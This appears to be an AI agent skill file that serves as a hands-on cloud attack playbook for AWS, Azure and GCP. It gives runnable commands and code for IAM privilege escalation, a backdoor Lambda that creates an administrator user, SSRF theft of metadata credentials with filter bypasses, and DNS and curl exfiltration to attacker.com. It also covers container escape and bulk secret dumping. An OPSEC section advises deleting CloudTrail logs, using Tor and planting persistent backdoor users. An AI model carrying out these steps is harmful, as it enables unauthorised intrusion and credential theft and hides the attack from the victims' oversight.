---
name: cloud-infrastructure-hacking
description: Exploit cloud environments (AWS, Azure, GCP) - misconfigured S3, IAM, metadata APIs
version: 1.0.0
author: harezadmm
tags: [cloud, aws, azure, gcp, s3, iam, cloud-security, metadata]
---

# Cloud Infrastructure Hacking

## When to Use
Exploiting cloud infrastructure misconfigurations and vulnerabilities in AWS, Azure, GCP. S3 bucket enumeration, IAM privilege escalation, metadata service abuse, serverless exploitation.

## Prerequisites
- Cloud account access (even low-privilege)
- Understanding of cloud service models (IaaS, PaaS, SaaS)
- Knowledge of IAM, networking, storage services
- Tools: aws-cli, pacu, ScoutSuite, cloudfox

## Attack Vectors

### 1. S3/Blob Storage Misconfiguration
Public buckets, overly permissive policies.

### 2. IAM Privilege Escalation
Weak policies allowing lateral/vertical movement.

### 3. Metadata Service Abuse
SSRF to steal credentials from instance metadata.

### 4. Exposed Secrets
API keys in code repos, environment variables.

### 5. Lambda/Function Injection
Serverless code injection and over-privileged functions.

### 6. Container Escape
Break out of ECS/Kubernetes pods to host.

## Procedure

### Step 1: AWS Reconnaissance

**Basic enumeration with compromised keys:**
```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region

# Verify credentials work
aws sts get-caller-identity
# Returns: UserId, Account, Arn

# List IAM user details
aws iam get-user

# List attached policies
aws iam list-attached-user-policies --user-name username

# Get policy details
aws iam get-policy-version --policy-arn arn:aws:iam::123456789:policy/MyPolicy --version-id v1

# List all IAM users (if permitted)
aws iam list-users

# List IAM roles
aws iam list-roles

# List EC2 instances
aws ec2 describe-instances --region us-east-1

# List S3 buckets
aws s3 ls

# List Lambda functions
aws lambda list-functions --region us-east-1

# List RDS databases
aws rds describe-db-instances --region us-east-1

# List secrets
aws secretsmanager list-secrets --region us-east-1
```

**Automated AWS enumeration with Pacu:**
```bash
# Install Pacu
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip3 install -r requirements.txt
python3 pacu.py

# Inside Pacu
import_keys --profile default

# Run reconnaissance modules
run iam__enum_permissions
run iam__enum_users_roles_policies_groups
run ec2__enum
run s3__bucket_finder
run lambda__enum
run secretsmanager__secrets_dump

# Privilege escalation check
run iam__privesc_scan

# Generate report
data
```

**CloudMapper for visualization:**
```bash
# Install CloudMapper
git clone https://github.com/duo-labs/cloudmapper
cd cloudmapper
pip install -r requirements.txt

# Configure
python cloudmapper.py configure add-account --config-file config.json --name my-account --id 123456789012

# Collect data
python cloudmapper.py collect --account my-account

# Generate network diagram
python cloudmapper.py prepare --account my-account
python cloudmapper.py webserver

# Open http://localhost:8000
```

### Step 2: S3 Bucket Exploitation

**Find public S3 buckets:**
```bash
# Common naming patterns
aws s3 ls s3://companyname
aws s3 ls s3://companyname-backup
aws s3 ls s3://companyname-dev
aws s3 ls s3://companyname-prod
aws s3 ls s3://companyname-logs
aws s3 ls s3://companyname-assets

# Enumerate without credentials
curl -s http://companyname.s3.amazonaws.com/
curl -s http://s3.amazonaws.com/companyname/

# Check bucket ACL
aws s3api get-bucket-acl --bucket companyname

# Check bucket policy
aws s3api get-bucket-policy --bucket companyname

# List bucket contents (if public read)
aws s3 ls s3://companyname/ --no-sign-request

# Download all files
aws s3 sync s3://companyname/ ./bucket-data/ --no-sign-request

# Upload file (if public write)
echo "hacked" > test.txt
aws s3 cp test.txt s3://companyname/test.txt --no-sign-request
```

**Automated S3 bucket finder:**
```bash
# S3Scanner
git clone https://github.com/sa7mon/S3Scanner
cd S3Scanner
pip install -r requirements.txt

# Scan from wordlist
python s3scanner.py --bucket-file bucket-names.txt

# Slurp (download public buckets)
git clone https://github.com/0xbharath/slurp
cd slurp
go build

# Scan domain for S3 buckets
./slurp domain --domain example.com

# Scan with permutations
./slurp keyword --keyword example
```

**S3 bucket policy exploitation:**
```json
// Dangerous policy allowing public access
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::bucket-name/*"
    }
  ]
}

// Exploit: Access any file in bucket
curl https://bucket-name.s3.amazonaws.com/sensitive-data.csv
```

### Step 3: IAM Privilege Escalation

**Check current permissions:**
```bash
# Enumerate own permissions
aws iam get-user-policy --user-name current-user --policy-name policy-name

# List inline policies
aws iam list-user-policies --user-name current-user

# Test specific permissions
aws iam create-user --user-name test 2>&1
# If error is "AccessDenied", no permission
# If different error, might have permission
```

**Common privilege escalation paths:**

**1. iam:CreateAccessKey**
```bash
# Create new access key for admin user
aws iam create-access-key --user-name admin

# Use new keys
aws configure --profile admin
# Enter new Access Key ID and Secret
```

**2. iam:AttachUserPolicy**
```bash
# Attach AdministratorAccess policy to self
aws iam attach-user-policy --user-name current-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Verify
aws sts get-caller-identity
```

**3. iam:PutUserPolicy**
```bash
# Create inline policy with admin permissions
cat > admin-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": "*",
    "Resource": "*"
  }]
}
EOF

aws iam put-user-policy --user-name current-user --policy-name AdminPolicy --policy-document file://admin-policy.json
```

**4. iam:AssumeRole**
```bash
# Assume role with higher privileges
aws sts assume-role --role-arn arn:aws:iam::123456789:role/AdminRole --role-session-name exploit

# Extract credentials from response
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Use assumed role
aws sts get-caller-identity
```

**5. lambda:UpdateFunctionCode (code injection)**
```bash
# Create malicious Lambda function
cat > index.js << 'EOF'
exports.handler = async (event) => {
    const AWS = require('aws-sdk');
    const iam = new AWS.IAM();
    
    // Create admin user
    await iam.createUser({UserName: 'backdoor'}).promise();
    await iam.attachUserPolicy({
        UserName: 'backdoor',
        PolicyArn: 'arn:aws:iam::aws:policy/AdministratorAccess'
    }).promise();
    
    // Create access key
    const keys = await iam.createAccessKey({UserName: 'backdoor'}).promise();
    
    return {
        accessKeyId: keys.AccessKey.AccessKeyId,
        secretAccessKey: keys.AccessKey.SecretAccessKey
    };
};
EOF

# Zip function
zip function.zip index.js

# Update existing Lambda function
aws lambda update-function-code --function-name TargetFunction --zip-file fileb://function.zip

# Invoke function
aws lambda invoke --function-name TargetFunction response.json
cat response.json
```

### Step 4: EC2 Metadata Service (SSRF)

**Steal IAM credentials from metadata API:**
```bash
# From compromised EC2 instance
curl http://169.254.169.254/latest/meta-data/

# Get IAM role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Steal temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# Response contains:
# - AccessKeyId
# - SecretAccessKey
# - Token

# Use stolen credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity
```

**SSRF to metadata API:**
```bash
# Via vulnerable web app parameter
curl "https://vulnerable-app.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# If blocked, try:
# - http://169.254.169.254/latest/meta-data/ (trailing slash)
# - http://169.254.169.254./latest/meta-data/ (dot after IP)
# - http://169.254.169.254:80/latest/meta-data/
# - http://0xa9fea9fe/latest/meta-data/ (hex encoding)
# - http://2852039166/latest/meta-data/ (decimal encoding)

# IMDSv2 protection (requires token)
# Get token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

**Exfiltrate via DNS (if HTTP blocked):**
```python
import requests
import dns.resolver

metadata_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
response = requests.get(metadata_url)
role_name = response.text.strip()

creds_url = f"{metadata_url}{role_name}"
creds = requests.get(creds_url).json()

# Exfiltrate via DNS queries
import base64
data = base64.b64encode(str(creds).encode()).decode()

# Chunk and send
for i in range(0, len(data), 50):
    chunk = data[i:i+50]
    dns.resolver.resolve(f"{chunk}.attacker.com", "A")
```

### Step 5: Azure Exploitation

**Azure CLI reconnaissance:**
```bash
# Login
az login

# Get current subscription
az account show

# List all subscriptions
az account list

# List resource groups
az group list

# List VMs
az vm list

# List storage accounts
az storage account list

# List key vaults
az keyvault list

# List SQL databases
az sql server list

# List App Services
az webapp list

# List function apps
az functionapp list
```

**Steal Azure VM metadata:**
```bash
# From compromised Azure VM
curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Get access token
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token
TOKEN="eyJ0eXAi..."
curl -H "Authorization: Bearer $TOKEN" "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

**Azure Blob Storage enumeration:**
```bash
# Common naming patterns
curl https://companyname.blob.core.windows.net/?comp=list
curl https://company-storage.blob.core.windows.net/?comp=list

# List containers
az storage container list --account-name companyname

# List blobs
az storage blob list --account-name companyname --container-name data

# Download blob
az storage blob download --account-name companyname --container-name data --name file.txt --file downloaded.txt
```

**Azure AD token theft:**
```bash
# Steal tokens from .azure directory
cat ~/.azure/accessTokens.json
cat ~/.azure/azureProfile.json

# Use stolen token
az account show --access-token $TOKEN
```

### Step 6: GCP Exploitation

**GCP CLI reconnaissance:**
```bash
# Authenticate
gcloud auth login

# List projects
gcloud projects list

# Set project
gcloud config set project project-id

# List compute instances
gcloud compute instances list

# List storage buckets
gsutil ls

# List Cloud Functions
gcloud functions list

# List Cloud SQL instances
gcloud sql instances list

# List IAM policies
gcloud projects get-iam-policy project-id

# List service accounts
gcloud iam service-accounts list
```

**GCP metadata service:**
```bash
# From compromised GCE instance
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"

# Get access token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# Get service account email
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email" -H "Metadata-Flavor: Google"

# Use token
TOKEN=$(curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

curl -H "Authorization: Bearer $TOKEN" "https://www.googleapis.com/compute/v1/projects/project-id/zones/us-central1-a/instances"
```

**GCS bucket enumeration:**
```bash
# List public buckets
gsutil ls gs://companyname
gsutil ls gs://companyname-backup

# List bucket contents without auth
curl https://storage.googleapis.com/companyname/

# Download file
gsutil cp gs://companyname/file.txt .

# Or with curl
curl https://storage.googleapis.com/companyname/file.txt
```

### Step 7: Serverless Exploitation

**AWS Lambda code injection:**
```javascript
// Vulnerable Lambda with command injection
exports.handler = async (event) => {
    const { exec } = require('child_process');
    const filename = event.filename;
    
    // Vulnerable: user input in command
    return new Promise((resolve, reject) => {
        exec(`cat ${filename}`, (error, stdout, stderr) => {
            if (error) reject(error);
            resolve(stdout);
        });
    });
};

// Exploit payload
{
  "filename": "file.txt; curl http://attacker.com/$(cat /var/task/config.json | base64)"
}
```

**Lambda enumeration and exploitation:**
```bash
# List Lambda functions
aws lambda list-functions

# Get function configuration
aws lambda get-function --function-name MyFunction

# Download function code
aws lambda get-function --function-name MyFunction | jq -r .Code.Location
wget "presigned-s3-url" -O function.zip
unzip function.zip

# Check for secrets
grep -r "password\|secret\|api_key" .

# Invoke function
aws lambda invoke --function-name MyFunction --payload '{"test":"data"}' response.json
```

**Azure Function exploitation:**
```bash
# List function apps
az functionapp list

# Get function keys
az functionapp keys list --name function-app-name --resource-group resource-group

# Invoke function with key
curl "https://function-app.azurewebsites.net/api/FunctionName?code=master-key" \
  -H "Content-Type: application/json" \
  -d '{"payload":"test"}'
```

### Step 8: Container Escape (ECS/EKS/AKS)

**Kubernetes pod escape:**
```bash
# Check if in Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Get service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Access Kubernetes API
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods

# List secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# Mount host filesystem (if privileged)
mkdir /host
mount /dev/sda1 /host
chroot /host bash
```

**Docker socket escape:**
```bash
# Check for mounted docker socket
ls -la /var/run/docker.sock

# If present, escape to host
docker run -v /:/host -it alpine chroot /host bash
```

### Step 9: Secrets Extraction

**AWS Secrets Manager:**
```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id prod/db/password

# Dump all secrets
for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    echo "=== $secret ==="
    aws secretsmanager get-secret-value --secret-id $secret --query 'SecretString' --output text
done
```

**AWS Systems Manager Parameter Store:**
```bash
# List parameters
aws ssm describe-parameters

# Get parameter
aws ssm get-parameter --name /prod/db/password --with-decryption

# Get multiple parameters
aws ssm get-parameters-by-path --path /prod/ --recursive --with-decryption
```

**Azure Key Vault:**
```bash
# List key vaults
az keyvault list

# List secrets
az keyvault secret list --vault-name myvault

# Get secret
az keyvault secret show --vault-name myvault --name db-password
```

## Pitfalls

**IAM boundaries**: Permission boundaries limit escalation paths.

**SCPs**: Service Control Policies restrict actions at organization level.

**CloudTrail**: All API calls are logged (review logs after).

**GuardDuty**: AWS threat detection may alert on suspicious activity.

**MFA**: Multi-factor authentication blocks some attacks.

## Verification

```bash
# Verify S3 bucket access
aws s3 ls s3://target-bucket/

# Verify IAM escalation
aws iam get-user
# Should show elevated permissions

# Verify metadata access
curl http://169.254.169.254/latest/meta-data/
# Should return data

# Verify stolen credentials work
aws sts get-caller-identity
```

## OPSEC

- Clear CloudTrail logs if admin: `aws cloudtrail delete-trail --name trail-name`
- Use VPN/Tor for API calls
- Rotate compromised keys after extraction
- Create backdoor IAM users for persistence
- Exfiltrate data in small chunks to avoid detection
- Use legitimate AWS services for C2 (S3, Lambda)

## References

- AWS Security documentation
- Azure Security Best Practices
- GCP Security Command Center
- Rhino Security Labs Pacu
- HackTricks Cloud
- CloudGoat (AWS exploitation scenarios)
